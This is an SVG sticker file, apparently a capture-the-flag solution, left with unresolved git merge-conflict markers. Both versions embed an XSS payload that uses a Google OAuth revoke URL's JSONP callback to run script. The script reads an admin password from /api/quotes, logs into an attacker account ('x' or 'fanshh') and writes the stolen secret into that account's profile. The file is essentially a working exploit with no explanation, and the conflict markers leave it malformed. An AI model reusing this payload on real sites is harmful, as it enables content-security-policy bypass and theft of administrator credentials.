<<<<<<< HEAD:web/quotes/quotes/web/src/public/stickers/f4574b7d302369dd02354d4b64bfe233.svg
<svg xmlns="http://www.w3.org/2000/svg">
    &lt;script href="https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/quotes')
                .then(function (res) { return res.json() })
                .then(function (data) {
                    if (data.success) {
                        const ADMIN_PASSWORD = data.data.password;
                        fetch('/api/login', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                username: 'x',
                                password: 'x' 
                            })
                        })
                        .then(function (res) { 
                            const formData = new FormData();
                            formData.append('about', ADMIN_PASSWORD);
                            fetch('/api/quotes', {
                                method: 'PUT',
                                body: formData
                            })
                        })
                    } 
                });"&gt;&lt;/script&gt;

    <script href="https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/quotes')
                .then(function (res) { return res.json() })
                .then(function (data) {
                    if (data.success) {
                        const ADMIN_PASSWORD = data.data.password;
                        fetch('/api/login', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                username: 'x',
                                password: 'x' 
                            })
                        })
                        .then(function (res) { 
                            const formData = new FormData();
                            formData.append('about', ADMIN_PASSWORD);
                            fetch('/api/quotes', {
                                method: 'PUT',
                                body: formData
                            })
                        })
                    } 
                });"></script>
</svg>
=======
<svg xmlns="http://www.w3.org/2000/svg">
    &#x3C;script href=&#x22;https://accounts.google.com/o/oauth2/revoke?callback=fetch(&#x27;/api/quotes&#x27;)
                .then(function (res) { return res.json() })
                .then(function (data) {
                    if (data.success) {
                        const ADMIN_COOKIE = data.data.password;
                        fetch(&#x27;/api/login&#x27;, {
                            method: &#x27;POST&#x27;,
                            headers: {
                                &#x27;Content-Type&#x27;: &#x27;application/json&#x27;
                            },
                            body: JSON.stringify({
                                username: &#x27;fanshh&#x27;,
                                password: &#x27;fanshh&#x27;
                            })
                        })
                        .then(function (res) {
                            const formData = new FormData();
                            formData.append(&#x27;about&#x27;, ADMIN_COOKIE);
                            fetch(&#x27;/api/quotes&#x27;, {
                                method: &#x27;PUT&#x27;,
                                body: formData
                            })
                        })
                    }
                });&#x22;&#x3E;&#x3C;/script&#x3E;

    <script href="https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/quotes')
                .then(function (res) { return res.json() })
                .then(function (data) {
                    if (data.success) {
                        const ADMIN_COOKIE = data.data.password;
                        fetch('/api/login', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                username: 'fanshh',
                                password: 'fanshh'
                            })
                        })
                        .then(function (res) {
                            const formData = new FormData();
                            formData.append('about', ADMIN_COOKIE);
                            fetch('/api/quotes', {
                                method: 'PUT',
                                body: formData
                            })
                        })
                    }
                });"></script>
</svg>
>>>>>>> c62a79e9bb8a7cefc0fcb1f2322de85d4a1d3839:web/quotes/web/src/public/stickers/97ddca84e62b201e58f6e8a3a25d5316.svg
